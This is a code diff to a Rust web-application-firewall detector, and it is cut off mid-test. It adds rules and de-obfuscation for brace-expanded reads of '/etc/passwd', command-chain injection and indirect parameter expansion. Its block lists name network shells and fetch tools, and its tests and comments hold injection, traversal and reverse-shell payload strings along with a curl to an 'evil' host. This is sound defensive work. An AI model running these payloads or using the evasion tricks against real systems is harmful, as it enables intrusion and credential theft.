@@ -15,6 +15,7 @@
 //! log_only`, so a match is at most logged + persisted, never a Block.
 
 use std::borrow::Cow;
+use std::sync::LazyLock;
 
 use brush_parser::ParserOptions;
 use brush_parser::ast as shell_ast;
@@ -334,6 +335,28 @@ const RCE_RULES: &[RuleRow] = &[
         RuleKind::Presence,
         true,
     ),
+    // Reading a sensitive file whose path is hidden behind a **brace expansion**:
+    // `cat /etc/{passwd,shadow}`. The shell expands the brace before the command
+    // runs, so the backend really opens `/etc/passwd`, but neither the literal
+    // `/etc/passwd` nor `/etc/shadow` appears in the request — the plain
+    // `rce.sensitive_read` rule above cannot see it, and the AST layer is a parser,
+    // not an expander. Kept as tight as its unbraced sibling: a reader command,
+    // then `/etc/{`, then `passwd` / `shadow` inside a single CLOSED brace group
+    // that also contains a comma. The comma is required because a comma-less
+    // `{passwd}` is **not** a brace expansion — bash leaves it literal, so it
+    // opens no secret and must not fire (the two alternatives below are simply the
+    // two possible orders of "comma" and "keyword" inside the group).
+    (
+        "rce.sensitive_read_brace",
+        70,
+        concat!(
+            r"\b(cat|less|more|head|tail|nl|od|xxd|strings)\s+/?etc/\{",
+            r"(?:[^{}]{0,64},[^{}]{0,64}\b(passwd|shadow)\b[^{}]{0,64}",
+            r"|[^{}]{0,64}\b(passwd|shadow)\b[^{}]{0,64},[^{}]{0,64})\}",
+        ),
+        RuleKind::Presence,
+        true,
+    ),
     // DEFAULT-OFF (codex A-4, joint structure): a FIFO reverse shell — `mkfifo`
     // followed (within a short window) by a shell / netcat reader, e.g.
     // `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i … | nc …`. Requiring the joint
@@ -476,6 +499,24 @@ const TRAVERSAL_RULES: &[RuleRow] = &[
         "traversal.sensitive_abs",
         68,
         r"/etc/(passwd|shadow)\b|/root/\.ssh/|(/|\\)windows(/|\\)(system32|win\.ini)|\bboot\.ini\b",
+        RuleKind::Presence,
+        true,
+    ),
+    // Sensitive absolute path hidden behind a **brace expansion**:
+    // `/etc/{passwd,shadow}`, `/etc/{hosts,passwd}`. Same tight list as
+    // `traversal.sensitive_abs` (only `passwd` / `shadow`), and the brace group
+    // must be anchored on `/etc/` and closed — a benign `{a,b}` in JSON, a
+    // template or a shell tutorial never satisfies that. Confidence matches the
+    // unbraced sibling: the obfuscation does not make the request *less* of a
+    // disclosure attempt, but it is the same single piece of evidence.
+    (
+        "traversal.sensitive_abs_brace",
+        68,
+        concat!(
+            r"/etc/\{",
+            r"(?:[^{}]{0,64},[^{}]{0,64}\b(passwd|shadow)\b[^{}]{0,64}",
+            r"|[^{}]{0,64}\b(passwd|shadow)\b[^{}]{0,64},[^{}]{0,64})\}",
+        ),
         RuleKind::Presence,
         true,
     ),
@@ -2280,6 +2321,128 @@ const EXEC_FLAGS: &[&str] = &["-c", "-e", "-enc", "-encodedcommand", "-command"]
 /// Sensitive absolute paths that make a reader command a disclosure attempt.
 const SENSITIVE_PATHS: &[&str] = &["/etc/passwd", "/etc/shadow", "/proc/self", "/proc/version"];
 
+/// Commands that make a *chained* stage (`…; cmd arg`, `… && cmd arg`,
+/// `… | cmd arg`) an execution attempt rather than prose — the semantic filter on
+/// top of the bare-separator structure the AST can see but a regex cannot
+/// (`rce_ast.cmd_chain_injection`).
+///
+/// Deliberately **excludes the classic pipeline filters** (`grep`, `awk`, `sed`,
+/// `sort`, `uniq`, `wc`, `cut`, `tr`, `tee`, `head`, `tail`, `less`, `more`,
+/// `jq`, `xargs`): a legitimate shell transcript pasted into a form
+/// (`$ cat access.log | awk '{print $1}'`) ends in a filter, while an injected
+/// chain ends in an executor. Including them reproduced exactly the noise that
+/// keeps `rce.cmd_sep_common` default-off.
+///
+/// Matched **case-sensitively** against the lower-case spelling: only a
+/// lower-case name actually executes on a POSIX backend, and requiring it keeps
+/// title-cased prose (`Alexa | Echo Dot`, `Dog | Cat food`, `Status | Type check`)
+/// out of the rule.
+const CHAIN_EXEC_CMDS: &[&str] = &[
+    // Interpreters / net shells (already covered as a *pipeline sink* by
+    // `pipe_to_interp`; listed here so `;` and `&&` chains reach them too).
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "ash",
+    "busybox",
+    "python",
+    "python2",
+    "python3",
+    "perl",
+    "ruby",
+    "php",
+    "node",
+    "nodejs",
+    "lua",
+    "powershell",
+    "pwsh",
+    "nc",
+    "ncat",
+    "netcat",
+    "socat",
+    "telnet",
+    // Destructive / state-changing.
+    "rm",
+    "mv",
+    "cp",
+    "ln",
+    "chmod",
+    "chown",
+    "chgrp",
+    "mkdir",
+    "rmdir",
+    "mkfifo",
+    "touch",
+    "kill",
+    "killall",
+    "pkill",
+    "dd",
+    "shred",
+    // Fetch / exfiltration.
+    "wget",
+    "curl",
+    "scp",
+    "sftp",
+    "ftp",
+    "tftp",
+    "ssh",
+    "certutil",
+    "bitsadmin",
+    // Recon / probe (the canary shapes: `1|echo pwned`, `x;id`, `x&&whoami`).
+    "echo",
+    "printf",
+    "id",
+    "whoami",
+    "uname",
+    "hostname",
+    "ifconfig",
+    "netstat",
+    "ps",
+    "env",
+    "printenv",
+    "ping",
+    "nslookup",
+    "dig",
+    "sleep",
+    "ls",
+    "dir",
+    "crontab",
+    "systemctl",
+    "service",
+    "iptables",
+    "useradd",
+    "usermod",
+    "groupadd",
+    "base64",
+    "xxd",
+    "eval",
+    "exec",
+    "nohup",
+    "wmic",
+    "reg",
+];
+
+/// Command names that mark the **leading** stage of a parse as a real shell
+/// command rather than injected data. A payload injected into a parameter has the
+/// shape `<original value><separator><command>`, so its first stage is a bare
+/// token (`1`, `x`, `x.jpg`) or an assignment — never a command invocation. A
+/// pasted shell transcript (`ls | rm -rf x`, `cd && make`) leads with a real
+/// command and must not fire.
+///
+/// Superset of [`CHAIN_EXEC_CMDS`] plus the filters/builtins deliberately kept out
+/// of it, so "leads with a real command" is judged on the widest list while
+/// "chains to an executor" is judged on the narrow one.
+const LEADING_SHELL_CMDS: &[&str] = &[
+    "grep", "egrep", "fgrep", "awk", "gawk", "sed", "sort", "uniq", "wc", "cut", "tr", "tee", "head", "tail", "less",
+    "more", "cat", "nl", "od", "strings", "jq", "xargs", "find", "file", "stat", "du", "df", "date", "time", "top",
+    "who", "w", "whereis", "which", "type", "test", "cd", "pwd", "export", "source", "make", "cmake", "npm", "npx",
+    "yarn", "pnpm", "bun", "cargo", "go", "git", "docker", "podman", "kubectl", "systemd", "apt", "apt-get", "yum",
+    "dnf", "pacman", "brew", "pip", "pip3", "gem", "composer", "mvn", "gradle", "ant", "tar", "gzip", "gunzip", "zip",
+    "unzip", "openssl", "man", "history", "alias", "set", "unset", "read", "true", "false", "yes", "seq", "sleep",
+];
+
 /// Commands whose appearance as the head of a `$(…)` / backtick command
 /// substitution promotes it from the high-noise `rce_ast.cmd_subst_any`
 /// (default-off) to the default-on `rce_ast.cmd_subst`. Union of the interpreter /
@@ -2343,14 +2506,242 @@ fn is_interpreter(name: &str) -> bool {
     INTERPRETERS.contains(&name) || name.starts_with("python")
 }
 
-/// Canonicalise a word value to a bare command name for matching: drop a single
-/// layer of surrounding quotes, take the trailing path component, lowercase.
-/// Best-effort — a word that is itself an expansion (`$x`, `$(…)`) yields a name
-/// that matches nothing, which is intentional (those are handled separately).
-fn cmd_basename(word_value: &str) -> String {
-    let unquoted = word_value.trim_matches(|c| c == '\'' || c == '"');
+/// Byte cap for the word-level de-obfuscation pass ([`deobfuscate_word`]). A word
+/// longer than this is returned untouched — the pass is a cheap best-effort
+/// de-obfuscator, not a general decoder, and the cap keeps its per-word cost
+/// bounded on a wide command line.
+const SHELL_WORD_DEOBF_MAX_CHARS: usize = 512;
+
+/// Byte cap for [`expand_braces_into`]: a longer word is not brace-expanded.
+const BRACE_MAX_INPUT_BYTES: usize = 256;
+
+/// Maximum number of brace-expansion results produced for one word.
+const BRACE_MAX_RESULTS: usize = 16;
+
+/// Maximum brace-expansion recursion depth (nested / sequential `{a,b}` groups).
+const BRACE_MAX_DEPTH: usize = 3;
+
+/// Best-effort **word-level de-obfuscation** applied before a word is matched as
+/// a command name or a sensitive path. Two shell constructs are resolved, both of
+/// which a pure parser leaves verbatim in the `Word` value (the honest boundary
+/// recorded in the shell-AST plan §1.3 observation B):
+///
+///  * **ANSI-C quoting** `$'\x63\x61\x74'` → `cat`. Bash decodes the escape
+///    sequences inside `$'…'` *before* the word is used as a command name, so a
+///    signature that only sees the literal `$'\x63…'` misses the command entirely.
+///    Handles `\xHH`, `\uHHHH`, `\nnn` (octal), and the single-character escapes.
+///  * **Indirect parameter expansion** `${!x}` → the empty string. `${!name}`
+///    expands to the value of the variable *named by* `name`; in an injected
+///    request the referenced variable is unset, so bash substitutes nothing. It is
+///    therefore a pure signature splitter — `c${!x}at /etc/passwd` runs `cat`.
+///    Removing it re-joins the split keyword.
+///
+/// Deliberately does **not** touch `${IFS}` / `$IFS` (which expand to a *space*,
+/// not to nothing — the preprocessor's `shell_normalize` owns that idiom) nor
+/// `${x}` / `$x` (whose value is backend state a WAF cannot know).
+///
+/// Pure, allocation-free on the common path (`Cow::Borrowed` when neither marker
+/// is present), never panics.
+fn deobfuscate_word(word_value: &str) -> Cow<'_, str> {
+    if !(word_value.contains("$'") || word_value.contains("${!")) {
+        return Cow::Borrowed(word_value);
+    }
+    let chars: Vec<char> = word_value.chars().collect();
+    if chars.len() > SHELL_WORD_DEOBF_MAX_CHARS {
+        return Cow::Borrowed(word_value);
+    }
+    let mut out = String::with_capacity(word_value.len());
+    let mut i = 0usize;
+    while let Some(&c) = chars.get(i) {
+        match (c, chars.get(i + 1).copied()) {
+            ('$', Some('\'')) => {
+                i += 2;
+                i = decode_ansi_c_body(&chars, i, &mut out);
+            }
+            ('$', Some('{')) if chars.get(i + 2) == Some(&'!') => {
+                // `${!name}` → empty. Skip to just past the closing brace; an
+                // unterminated form is emitted literally (no silent truncation).
+                let mut j = i + 3;
+                let mut closed = false;
+                while let Some(&cj) = chars.get(j) {
+                    if cj == '}' {
+                        closed = true;
+                        break;
+                    }
+                    j += 1;
+                }
+                if closed {
+                    i = j + 1;
+                } else {
+                    out.push(c);
+                    i += 1;
+                }
+            }
+            _ => {
+                out.push(c);
+                i += 1;
+            }
+        }
+    }
+    Cow::Owned(out)
+}
+
+/// Decode the body of an ANSI-C `$'…'` quote starting at `start` (just past the
+/// opening quote), appending the decoded text to `out`. Returns the index just
+/// past the closing quote (or the end of input for an unterminated quote).
+fn decode_ansi_c_body(chars: &[char], start: usize, out: &mut String) -> usize {
+    let mut i = start;
+    while let Some(&c) = chars.get(i) {
+        if c == '\'' {
+            return i + 1;
+        }
+        if c != '\\' {
+            out.push(c);
+            i += 1;
+            continue;
+        }
+        // Escape sequence.
+        let Some(&esc) = chars.get(i + 1) else {
+            out.push('\\');
+            return i + 1;
+        };
+        i += 2;
+        match esc {
+            'n' => out.push('\n'),
+            't' => out.push('\t'),
+            'r' => out.push('\r'),
+            'a' => out.push('\u{7}'),
+            'b' => out.push('\u{8}'),
+            'f' => out.push('\u{c}'),
+            'v' => out.push('\u{b}'),
+            'e' | 'E' => out.push('\u{1b}'),
+            '\\' | '\'' | '"' | '?' => out.push(esc),
+            'x' | 'u' | 'U' => {
+                let width = match esc {
+                    'x' => 2,
+                    'u' => 4,
+                    _ => 8,
+                };
+                let mut value: u32 = 0;
+                let mut taken = 0usize;
+                while taken < width
+                    && let Some(d) = chars.get(i).and_then(|d| d.to_digit(16))
+                {
+                    value = value.saturating_mul(16).saturating_add(d);
+                    i += 1;
+                    taken += 1;
+                }
+                if taken == 0 {
+                    out.push(esc);
+                } else if let Some(ch) = char::from_u32(value) {
+                    out.push(ch);
+                }
+            }
+            '0'..='7' => {
+                let mut value: u32 = esc.to_digit(8).unwrap_or(0);
+                let mut taken = 1usize;
+                while taken < 3
+                    && let Some(d) = chars.get(i).and_then(|d| d.to_digit(8))
+                {
+                    value = value.saturating_mul(8).saturating_add(d);
+                    i += 1;
+                    taken += 1;
+                }
+                if let Some(ch) = char::from_u32(value) {
+                    out.push(ch);
+                }
+            }
+            other => out.push(other),
+        }
+    }
+    i
+}
+
+/// Bounded **brace expansion** of one word (`/etc/{passwd,shadow}` →
+/// `/etc/passwd`, `/etc/shadow`). The shell expands braces *before* the command
+/// runs, so a brace-obfuscated path reaches the backend as the real path; the
+/// parser, being a parser and not an expander, keeps the literal
+/// `"/etc/{passwd,shadow}"` in the `Word` (shell-AST plan §1.3 observation B).
+/// This closes that gap for the *sensitive-path* test only.
+///
+/// Hard-bounded so a crafted `{a,b}{a,b}{a,b}…` cannot drive combinatorial work:
+/// at most [`BRACE_MAX_RESULTS`] outputs, [`BRACE_MAX_DEPTH`] nested groups, and
+/// only inputs up to [`BRACE_MAX_INPUT_BYTES`]. A `${…}` parameter expansion is
+/// **not** a brace expansion and is left alone. Never panics.
+fn expand_braces_into(s: &str, depth: usize, out: &mut Vec<String>) {
+    if out.len() >= BRACE_MAX_RESULTS {
+        return;
+    }
+    if depth >= BRACE_MAX_DEPTH || s.len() > BRACE_MAX_INPUT_BYTES {
+        out.push(s.to_owned());
+        return;
+    }
+    // First brace group that is a real alternation (`{a,b}`). A `${…}` parameter
+    // expansion, a comma-less `{x}` and a group containing a nested `{` are
+    // literals here and are skipped rather than aborting the whole scan.
+    let mut group = None;
+    for (open, _) in s.match_indices('{') {
+        if s.get(..open).is_some_and(|p| p.ends_with('$')) {
+            continue;
+        }
+        let Some(rest) = s.get(open + 1..) else { continue };
+        let mut close_rel = None;
+        for (idx, c) in rest.char_indices() {
+            match c {
+                '{' => break,
+                '}' => {
+                    close_rel = Some(idx);
+                    break;
+                }
+                _ => {}
+            }
+        }
+        let Some(close_rel) = close_rel else { continue };
+        if rest.get(..close_rel).is_some_and(|inner| inner.contains(',')) {
+            group = Some((open, close_rel));
+            break;
+        }
+    }
+    let Some((open, close_rel)) = group else {
+        out.push(s.to_owned());
+        return;
+    };
+    let (Some(prefix), Some(rest)) = (s.get(..open), s.get(open + 1..)) else {
+        out.push(s.to_owned());
+        return;
+    };
+    let (Some(inner), Some(suffix)) = (rest.get(..close_rel), rest.get(close_rel + 1..)) else {
+        out.push(s.to_owned());
+        return;
+    };
+    for alt in inner.split(',') {
+        if out.len() >= BRACE_MAX_RESULTS {
+            return;
+        }
+        let mut candidate = String::with_capacity(prefix.len() + alt.len() + suffix.len());
+        candidate.push_str(prefix);
+        candidate.push_str(alt);
+        candidate.push_str(suffix);
+        expand_braces_into(&candidate, depth + 1, out);
+    }
+}
+
+/// Canonicalise a word value to a bare command name for matching, **preserving
+/// case**: de-obfuscate ([`deobfuscate_word`]), drop a single layer of surrounding
+/// quotes, take the trailing path component. Best-effort — a word that is itself
+/// an expansion (`$x`, `$(…)`) yields a name that matches nothing, which is
+/// intentional (those are handled separately).
+fn cmd_basename_cased(word_value: &str) -> String {
+    let deobf = deobfuscate_word(word_value);
+    let unquoted = deobf.trim_matches(|c| c == '\'' || c == '"');
     let base = unquoted.rsplit(['/', '\\']).next().unwrap_or(unquoted);
-    base.to_ascii_lowercase()
+    base.to_owned()
+}
+
+/// Case-folded [`cmd_basename_cased`] — the form the interpreter / net-shell /
+/// reader word lists are matched against.
+fn cmd_basename(word_value: &str) -> String {
+    cmd_basename_cased(word_value).to_ascii_lowercase()
 }
 
 /// The plain command-head name of a simple command, if it has one.
@@ -2368,9 +2759,24 @@ fn is_devtcp_target(word_value: &str) -> bool {
 /// Whether a word value contains a sensitive absolute path (substring match on the
 /// canonical forms — a `cat /etc/passwd` argument or a `cat$IFS/etc/passwd` form
 /// already collapsed by the shell-normalise view).
+///
+/// Sees through the two word-level obfuscations the parser leaves verbatim:
+/// ANSI-C quoting / indirect expansion ([`deobfuscate_word`]) and **brace
+/// expansion** ([`expand_braces_into`]) — `cat /etc/{passwd,shadow}` reads
+/// `/etc/passwd` on the backend, so it must read as a sensitive argument here.
 fn arg_hits_sensitive_path(word_value: &str) -> bool {
-    let l = word_value.to_ascii_lowercase();
-    SENSITIVE_PATHS.iter().any(|p| l.contains(p))
+    let l = deobfuscate_word(word_value).to_ascii_lowercase();
+    if SENSITIVE_PATHS.iter().any(|p| l.contains(p)) {
+        return true;
+    }
+    if !l.contains('{') {
+        return false;
+    }
+    let mut expanded = Vec::new();
+    expand_braces_into(&l, 0, &mut expanded);
+    expanded
+        .iter()
+        .any(|cand| SENSITIVE_PATHS.iter().any(|p| cand.contains(p)))
 }
 
 /// Whether the inner text of a command substitution leads with a dangerous binary
@@ -2438,6 +2844,42 @@ const RCE_AST_RULES: &[ShellAstRule] = &[
     ShellAstRule {
         key: "rce_ast.sensitive_read",
         confidence: 70,
+        default_on: true,
+    },
+    // A bare separator (`;` / `&&` / `||` / `|`) chaining *injected data* to an
+    // executor with an argument: `1|echo pwned`, `x && rm -rf /`. Structural, and
+    // only decidable on a quote-aware parse — this is the gap the regex layer
+    // could only close with the high-noise `rce.cmd_sep_common` (default-off).
+    //
+    // confidence 80 is a deliberate ceiling, not a guess: the `rce` family weights
+    // `rce`/`rce_ast` at 0.5 each with log_threshold 40 / block_threshold 80, so
+    // 0.5·80 = 40 lands EXACTLY on Log and 40 < 80 means this rule can never
+    // Block on its own — a false positive costs one shadow log line, never a
+    // dropped request. Reaching Block still needs the structural detector to
+    // corroborate independently.
+    ShellAstRule {
+        key: "rce_ast.cmd_chain_injection",
+        confidence: 80,
+        default_on: true,
+    },
+    // A bash extended test (`[[ -f /etc/passwd ]]`) probing a sensitive path.
+    // `Command::ExtendedTest` used to be an explicit empty arm, so the whole
+    // conditional form was dropped on the floor. 0.5·70 = 35 < log_threshold, so
+    // this is corroboration + shadow telemetry, never a standalone verdict.
+    ShellAstRule {
+        key: "rce_ast.cond_sensitive_path",
+        confidence: 70,
+        default_on: true,
+    },
+    // Indirect parameter expansion `${!x}` — a bash-only construct that expands to
+    // the empty string for an unset variable and therefore exists, in a request
+    // field, to split a keyword past a signature (`c${!x}at`). On its own it
+    // executes nothing, so 0.5·60 = 30 < log_threshold(40) by construction: it can
+    // never raise a verdict alone, it only lands in `semantic_observations` for
+    // holdout calibration and corroborates a second RCE detector.
+    ShellAstRule {
+        key: "rce_ast.param_indirect",
+        confidence: 60,
         default_on: true,
     },
     // DEFAULT-OFF (high-noise): any command substitution regardless of inner
@@ -2618,7 +3060,35 @@ fn shell_ast_prefilter(s: &str) -> bool {
         || s.contains(" -e")
         || s.contains("/etc/")
         || s.contains("/proc/")
+        // Indirect parameter expansion — the `rce_ast.param_indirect` marker.
+        // Narrow on purpose: a bare `${` (JS template literal, `${IFS}`, any
+        // templating language) is far too common to spend a parse on.
+        || s.contains("${!")
+        // A `;` / `&&` / `||` chain into an executor — the `cmd_chain_injection`
+        // marker. Gated on the *joint* shape rather than on a bare `;` (which
+        // occurs in every cookie, `Accept` header and CSS declaration) so the
+        // shared per-request AST budget is not spent on ordinary traffic. `|` is
+        // already admitted above, so this only widens `;`, `&&` and `||`.
+        || SEP_EXEC_MARKER.as_ref().is_some_and(|re| re.is_match(s))
 }
+
+/// Cheap pre-parse marker for a separator chained into an executor
+/// (`…;rm -rf /`, `x && curl http://evil/`). Case-sensitive: only a lower-case
+/// command name executes, and title-cased prose (`Foo && Bar`) must not buy a
+/// parse. `None` only if the constant pattern fails to compile (it will not), in
+/// which case the two extra separators simply do not admit a parse (no panic).
+static SEP_EXEC_MARKER: LazyLock<Option<Regex>> = LazyLock::new(|| {
+    Regex::new(concat!(
+        r"(?:&&|\|\||[;|])\s*/?(?:usr/)?(?:s?bin/)?",
+        r"(?:rm|mv|cp|ln|chmod|chown|chgrp|mkdir|rmdir|mkfifo|touch|kill|killall|pkill|dd|shred",
+        r"|wget|curl|scp|sftp|ftp|tftp|ssh|certutil|bitsadmin",
+        r"|echo|printf|id|whoami|uname|hostname|ifconfig|netstat|ps|env|printenv|ping|nslookup|dig|sleep",
+        r"|ls|dir|crontab|systemctl|service|iptables|useradd|usermod|groupadd|base64|xxd|eval|exec|nohup|wmic|reg",
+        r"|sh|bash|zsh|dash|ksh|ash|busybox|python[0-9.]*|perl|ruby|php|node|nodejs|lua|powershell|pwsh",
+        r"|nc|ncat|netcat|socat|telnet)\b",
+    ))
+    .ok()
+});
 
 /// Cheap single-pass scan of the maximum number of *concurrently unclosed*
 /// recursion-driving shell delimiters in `s` — the stack-overflow protection for
@@ -2658,6 +3128,98 @@ fn max_nesting_depth(s: &str) -> usize {
 fn walk_program(program: &shell_ast::Program, walk: &mut ShellWalk<'_>) {
     for cc in &program.complete_commands {
         walk_list(cc, 0, walk);
+        detect_cmd_chain_injection(cc, walk);
+    }
+}
+
+/// Number of **argument** words on a simple command (suffix words only —
+/// assignments and redirects are not arguments).
+fn simple_cmd_arg_count(sc: &shell_ast::SimpleCommand) -> usize {
+    sc.suffix.as_ref().map_or(0, |s| {
+        s.0.iter()
+            .filter(|i| matches!(i, shell_ast::CommandPrefixOrSuffixItem::Word(_)))
+            .count()
+    })
+}
+
+/// The command-head name of a simple command with its **case preserved**.
+fn simple_cmd_name_cased(sc: &shell_ast::SimpleCommand) -> Option<String> {
+    sc.word_or_name.as_ref().map(|w| cmd_basename_cased(&w.value))
+}
+
+/// Whether a stage looks like the **injected-into value** rather than a command:
+/// a bare token with no arguments (`1`, `x`, `x.jpg`), or a pure assignment /
+/// redirect (`value=a`). A stage that names a real shell command — even with no
+/// arguments (`ls | …`, `cd && …`) — is a pasted transcript, not an injection
+/// point, and disqualifies the whole chain.
+fn is_injected_data_stage(cmd: Option<&shell_ast::SimpleCommand>) -> bool {
+    let Some(sc) = cmd else { return false };
+    if simple_cmd_arg_count(sc) > 0 {
+        return false;
+    }
+    // `None` = assignment / redirect only (`value=a|b|c`, `>out.txt`) — still the
+    // injected value, not a command invocation.
+    simple_cmd_name_cased(sc)
+        .is_none_or(|name| !CHAIN_EXEC_CMDS.contains(&name.as_str()) && !LEADING_SHELL_CMDS.contains(&name.as_str()))
+}
+
+/// Whether a stage is an **executor invocation**: a lower-case executor name from
+/// [`CHAIN_EXEC_CMDS`] carrying at least one argument. The argument requirement
+/// keeps a bare word in a table / enumeration (`name | id | email`) out, and the
+/// case-sensitivity keeps title-cased prose (`Alexa | Echo Dot`) out.
+fn is_executor_stage(cmd: Option<&shell_ast::SimpleCommand>) -> bool {
+    let Some(sc) = cmd else { return false };
+    if simple_cmd_arg_count(sc) == 0 {
+        return false;
+    }
+    simple_cmd_name_cased(sc).is_some_and(|n| CHAIN_EXEC_CMDS.contains(&n.as_str()))
+}
+
+/// Fire [`rce_ast.cmd_chain_injection`](RCE_AST_RULES) on the classic
+/// command-injection shape: *injected value* → bare separator → *executor with an
+/// argument*, e.g. `1|echo pwned`, `x && rm -rf /`, `x.jpg;curl http://evil/`.
+///
+/// This is the structured judgement `walk_pipeline` / `walk_and_or` previously
+/// declined to make (they only recursed). Doing it on the AST rather than with a
+/// regex is what makes it safe: the parser is quote-aware (`echo "a; rm -rf /"` is
+/// ONE command, not a chain), it distinguishes an assignment from a command
+/// (`value=a|b|c`), and it can tell "bare token" from "command invocation" — the
+/// three discriminations `rce.cmd_sep_common` cannot make, which is why that rule
+/// ships default-off.
+///
+/// Only the **leading** stage of the chain is allowed to be the injected value:
+/// an injected parameter is appended to the original value, so the payload always
+/// has the data first. A pasted shell transcript (`$ cat access.log | awk …`,
+/// `cd /tmp && rm -rf x`) leads with a real command *with arguments* and is
+/// rejected on the first test.
+fn detect_cmd_chain_injection(list: &shell_ast::CompoundList, walk: &mut ShellWalk<'_>) {
+    let mut stages: Vec<Option<&shell_ast::SimpleCommand>> = Vec::new();
+    for item in &list.0 {
+        let aol = &item.0;
+        collect_pipeline_stages(&aol.first, &mut stages);
+        for ao in &aol.additional {
+            let (shell_ast::AndOr::And(p) | shell_ast::AndOr::Or(p)) = ao;
+            collect_pipeline_stages(p, &mut stages);
+        }
+    }
+    if stages.len() < 2 {
+        return;
+    }
+    if !is_injected_data_stage(stages.first().copied().flatten()) {
+        return;
+    }
+    if stages.iter().skip(1).any(|s| is_executor_stage(*s)) {
+        walk.fire("rce_ast.cmd_chain_injection");
+    }
+}
+
+/// Append each stage of a pipeline to `stages` (`None` for a non-simple stage).
+fn collect_pipeline_stages<'a>(pipe: &'a shell_ast::Pipeline, stages: &mut Vec<Option<&'a shell_ast::SimpleCommand>>) {
+    for cmd in &pipe.seq {
+        stages.push(match cmd {
+            shell_ast::Command::Simple(sc) => Some(sc),
+            _ => None,
+        });
     }
 }
 
@@ -2704,7 +3266,50 @@ fn walk_command(cmd: &shell_ast::Command, depth: usize, walk: &mut ShellWalk<'_>
         shell_ast::Command::Simple(sc) => classify_simple(sc, walk),
         shell_ast::Command::Compound(cc, _redirects) => walk_compound(cc, depth + 1, walk),
         shell_ast::Command::Function(fd) => walk_compound(&fd.body.0, depth + 1, walk),
-        shell_ast::Command::ExtendedTest(_, _) => {}
+        shell_ast::Command::ExtendedTest(etc, _redirects) => walk_extended_test(&etc.expr, depth + 1, walk),
+    }
+}
+
+/// Walk a bash extended test (`[[ -f /etc/passwd ]]`, `[[ $x == $(id) ]]`).
+///
+/// This arm used to be an explicit no-op, so every conditional form — including a
+/// sensitive-path probe and a command substitution smuggled into a comparison —
+/// was discarded at the AST layer. Operand words are checked for a sensitive path
+/// and sub-parsed for `$(…)` / backtick substitutions, exactly like a simple
+/// command's arguments. Depth-bounded like every other walk (never panics).
+fn walk_extended_test(expr: &shell_ast::ExtendedTestExpr, depth: usize, walk: &mut ShellWalk<'_>) {
+    if depth > SHELL_WALK_MAX_DEPTH {
+        return;
+    }
+    match expr {
+        shell_ast::ExtendedTestExpr::And(a, b) | shell_ast::ExtendedTestExpr::Or(a, b) => {
+            walk_extended_test(a, depth + 1, walk);
+            walk_extended_test(b, depth + 1, walk);
+        }
+        shell_ast::ExtendedTestExpr::Not(a) | shell_ast::ExtendedTestExpr::Parenthesized(a) => {
+            walk_extended_test(a, depth + 1, walk);
+        }
+        shell_ast::ExtendedTestExpr::UnaryTest(_, w) => classify_test_word(&w.value, walk),
+        shell_ast::ExtendedTestExpr::BinaryTest(_, l, r) => {
+            classify_test_word(&l.value, walk);
+            classify_test_word(&r.value, walk);
+        }
+    }
+}
+
+/// Classify one extended-test operand word.
+fn classify_test_word(value: &str, walk: &mut ShellWalk<'_>) {
+    if arg_hits_sensitive_path(value) {
+        walk.fire("rce_ast.cond_sensitive_path");
+    }
+    classify_word_obfuscation(value, walk);
+    classify_word_cmdsubst(value, walk);
+}
+
+/// Fire the word-level obfuscation rules for one word value.
+fn classify_word_obfuscation(value: &str, walk: &mut ShellWalk<'_>) {
+    if value.contains("${!") {
+        walk.fire("rce_ast.param_indirect");
     }
 }
 
@@ -2738,6 +3343,7 @@ fn classify_simple(sc: &shell_ast::SimpleCommand, walk: &mut ShellWalk<'_>) {
     // The command head itself may be a substitution (`$(id)` as the command).
     if let Some(w) = &sc.word_or_name {
         classify_word_cmdsubst(&w.value, walk);
+        classify_word_obfuscation(&w.value, walk);
     }
 
     let empty = Vec::new();
@@ -2753,10 +3359,12 @@ fn classify_simple(sc: &shell_ast::SimpleCommand, walk: &mut ShellWalk<'_>) {
                     sensitive_arg = true;
                 }
                 classify_word_cmdsubst(&w.value, walk);
+                classify_word_obfuscation(&w.value, walk);
             }
             shell_ast::CommandPrefixOrSuffixItem::AssignmentWord(_, w) => {
                 // `x=$(id) cmd` — a substitution smuggled through an assignment.
                 classify_word_cmdsubst(&w.value, walk);
+                classify_word_obfuscation(&w.value, walk);
             }
             shell_ast::CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => proc_subst = true,
             shell_ast::CommandPrefixOrSuffixItem::IoRedirect(io) => match io {
@@ -3126,8 +3734,37 @@ mod tests {
             "rce.piped_shell",
             "rce.fetch_exec",
             "rce.sensitive_read",
+            "rce.sensitive_read_brace",
         ] {
             assert!(on.contains(onk), "{onk} must be default-on");
+        }
+    }
+
+    #[test]
+    fn rce_brace_obfuscated_sensitive_read_fires() {
+        // The literal `/etc/passwd` never appears — only the brace expansion the
+        // shell performs before `cat` runs.
+        for payload in [
+            "cat /etc/{passwd,shadow}",
+            "head /etc/{hosts,passwd}",
+            "xxd /etc/{a,b,shadow}",
+        ] {
+            let f = rce_fire(payload).unwrap_or_else(|| panic!("brace read must fire: {payload}"));
+            assert_eq!(f.rule_key, "rce.sensitive_read_brace", "payload {payload}");
+            assert_eq!(f.confidence, 70);
+        }
+        // Negatives: no sensitive member, no reader, or no closed brace group.
+        for benign in [
+            "cat /etc/{hosts,resolv.conf}",
+            "cp report-{2024,2025}.csv /backup/",
+            "the config is at /etc/{app} and the password policy lives elsewhere",
+            r#"{"path":"/etc/","file":"passwd"}"#,
+            "ls /etc/{passwd,shadow}",
+            // `{passwd}` has no comma → bash does NOT brace-expand it, so it
+            // opens no secret and must not fire.
+            "cat /etc/{passwd}",
+        ] {
+            assert!(rce_fire(benign).is_none(), "benign brace payload fired: {benign}");
         }
     }
 
@@ -3337,8 +3974,33 @@ mod tests {
             "traversal.overlong",
             "traversal.encoded_dotdot",
             "traversal.sensitive_abs",
+            "traversal.sensitive_abs_brace",
         ] {
             assert!(on.contains(onk), "{onk} must be default-on");
+        }
+    }
+
+    #[test]
+    fn traversal_brace_obfuscated_sensitive_abs_fires() {
+        for payload in [
+            "/etc/{passwd,shadow}",
+            "file=/etc/{a,passwd}",
+            "../../etc/{passwd,group}",
+        ] {
+            let f = trav_fire(payload).unwrap_or_else(|| panic!("brace abs path must fire: {payload}"));
+            assert_eq!(f.rule_key, "traversal.sensitive_abs_brace", "payload {payload}");
+            assert_eq!(f.attack, AttackKind::Traversal);
+        }
+        // Negatives: benign brace groups, and `/etc/` without a braced secret.
+        for benign in [
